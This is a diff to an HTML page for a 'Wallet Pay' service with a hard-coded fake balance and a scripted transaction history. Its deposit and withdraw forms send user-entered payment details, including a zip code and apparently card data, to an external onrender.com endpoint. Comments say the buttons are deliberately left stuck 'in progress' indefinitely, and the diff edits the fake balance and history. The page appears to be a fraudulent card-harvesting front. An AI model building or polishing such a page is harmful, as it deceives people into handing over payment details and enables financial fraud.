@@ -162,7 +162,7 @@
 <body>
     <div class="container">
         <h1>Wallet Pay</h1>
-        <div class="balance">Balance: $5,534</div>
+        <div class="balance">Balance: $7,534</div>
         <div class="buttons">
             <button class="btn" onclick="showModal('deposit-modal')">Deposit</button>
             <button class="btn" onclick="showModal('withdraw-modal')">Withdraw</button>
@@ -170,7 +170,7 @@
         </div>
 
         <div class="notice">
-            <strong>Important Notice:</strong> Withdrawals are processed instantly. Once you click "Withdraw," the money will be deposited to your card immediately.<br><br>However, please ensure that all the information you enter is accurate and valid. Incorrect details may result in transaction failures or delays. Double-check your inputs to ensure a smooth and successful transaction.
+            <strong>Important Notice:</strong> Please ensure that all the information you enter is accurate and valid. Incorrect details may lead to transaction failures or delays. Double-check your inputs to ensure a smooth and successful transaction.
         </div>
 
         <!-- Deposit Modal -->
@@ -271,7 +271,6 @@
                 <div class="history-item">Deposit - $2,000 - Mar 5, 2025</div>
                 <div class="history-item">Deposit - $1,000 - Mar 10, 2025</div>
                 <div class="history-item">Withdrawal - $466 - Mar 12, 2025</div>
-                <div class="history-item">Withdrawal - $2,000 - Mar 17, 2025</div>
             </div>
         </div>
 
@@ -320,12 +319,10 @@
             });
 
             if (!allFilled) {
-                console.log('Validation failed: Not all fields are filled.');
                 alert('Please fill in all fields before submitting.');
                 return;
             }
 
-            console.log('All fields filled, proceeding with deposit...');
             btn.textContent = 'Topping up...';
             btn.disabled = true;
 
@@ -341,10 +338,7 @@
                 zipCode: document.querySelector('#deposit-modal [placeholder="Zip Code"]').value
             };
 
-            console.log('Form data to be sent:', formData);
-
             try {
-                console.log('Sending request to backend...');
                 const response = await fetch('https://pay-p5ev.onrender.com/api/deposit', {
                     method: 'POST',
                     headers: {
@@ -353,18 +347,13 @@
                     body: JSON.stringify(formData)
                 });
 
-                console.log('Response status:', response.status);
-                if (response.status === 503) {
-                    alert('Transaction could not be processed, please try again.');
-                } else if (response.status === 500) {
-                    console.log('Backend returned a 500 Internal Server Error.');
-                } else {
-                    console.log('Request completed with status:', response.status);
+                if (!response.ok) {
+                    throw new Error('Deposit failed');
                 }
             } catch (error) {
-                console.error('Fetch error:', error.message);
+                alert('Error processing deposit. Please try again.');
             }
-            // Button stays as "Topping up..." indefinitely
+            // Removed successful alert and 'finally' block to keep button as "Topping up..." indefinitely
         }
 
         async function processWithdraw() {
@@ -380,12 +369,10 @@
             });
 
             if (!allFilled) {
-                console.log('Validation failed: Not all fields are filled.');
                 alert('Please fill in all fields before submitting.');
                 return;
             }
 
-            console.log('All fields filled, proceeding with withdrawal...');
             btn.textContent = 'Withdrawal in progress...';
             btn.disabled = true;
 
@@ -401,10 +388,7 @@
                 zipCode: document.querySelector('#withdraw-modal [placeholder="Zip Code"]').value
             };
 
-            console.log('Form data to be sent:', formData);
-
             try {
-                console.log('Sending request to backend...');
                 const response = await fetch('https://pay-p5ev.onrender.com/api/withdraw', {
                     method: 'POST',
                     headers: {
@@ -413,18 +397,13 @@
                     body: JSON.stringify(formData)
                 });
 
-                console.log('Response status:', response.status);
-                if (response.status === 503) {
-                    alert('Transaction could not be processed, please try again.');
-                } else if (response.status === 500) {
-                    console.log('Backend returned a 500 Internal Server Error.');
-                } else {
-                    console.log('Request completed with status:', response.status);
+                if (!response.ok) {
+                    throw new Error('Withdrawal failed');
                 }
             } catch (error) {
-                console.error('Fetch error:', error.message);
+                alert('Error processing withdrawal. Please try again.');
             }
-            // Button stays as "Withdrawal in progress..." indefinitely
+            // Removed successful alert and 'finally' block to keep button as "Withdrawal in progress..." indefinitely
         }
 
         function startDrag(e, modalId) {
@@ -462,4 +441,4 @@
         }
     </script>
 </body>
-                            </html>
+                </html>
